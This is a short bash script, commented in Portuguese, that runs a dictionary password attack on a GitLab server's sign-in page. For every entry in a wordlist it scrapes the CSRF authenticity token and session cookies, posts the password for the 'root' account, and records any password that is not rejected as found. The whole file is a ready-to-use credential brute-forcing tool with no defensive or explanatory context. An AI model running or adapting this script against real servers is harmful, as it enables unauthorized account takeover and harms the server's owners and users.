#!/bin/bash

gitserver="seuserver.com.br"        # Somente o domínio ou IP
usuario="root"                      # Nome de usuário
dict="/usr/share/wordlists/wl.txt"  # Dicionário de senhas

for senha in $(cat ${dict}); do

auth1=$(curl -s -c cookies.txt https://${gitserver}/users/sign_in | grep authenticity | cut -d " " -f11 | cut -d '"' -f2)
token=$(echo -n $auth1)
gitlab_session=$(cat cookies.txt | grep gitlab_session | cut -d $'\t' -f7)
cookie1=$(cat cookies.txt | grep TRUE | cut -d $'\t' -f6)
cookie2=$(cat cookies.txt | grep TRUE | cut -d $'\t' -f7)

curl -s -k -X $'POST' -H $"Host: ${gitserver}" -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $"Origin: https:/${gitserver}" -H $'Connection: keep-alive' -H $"Referer: https://${gitserver}/users/sign_in" -b $"_gitlab_session=${gitlab_session}; ${cookie1}=${cookie2}" -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' --data-urlencode "authenticity_token=${token}" --data "user%5Blogin%5D=${usuario}" --data-urlencode "user%5Bpassword%5D=${senha}" --data "user%5Bremember_me%5D=0" -x localhost:8080 $"https://${gitserver}/users/sign_in" > request.txt

if [[ $(cat request.txt | grep -i invalid) == *'Invalid'* ]]; then
  echo $senha "= Senha inválida!"
else
  echo Senha encontrada: $senha
  echo Senha: $senha >> senha-encontrada.txt
fi
done > bruteforce.log
